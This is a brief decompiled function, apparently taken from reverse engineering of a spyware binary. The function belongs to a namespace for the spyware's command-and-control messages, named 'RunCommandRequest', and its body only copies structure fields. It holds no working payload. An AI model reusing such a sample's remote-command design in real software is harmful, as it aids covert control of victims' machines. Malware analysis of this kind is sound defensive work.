
  int512_t spyware::communication::messages::Message::RunCommandRequest::h075183aa725d84a0(int64_t* arg1, int128_t* arg2)

{
    int128_t result = *arg2;
    *(arg1 + 0x18) = arg2[1];
    *(arg1 + 8) = result;
    *arg1 = -0x8000000000000000;
    return result;
}
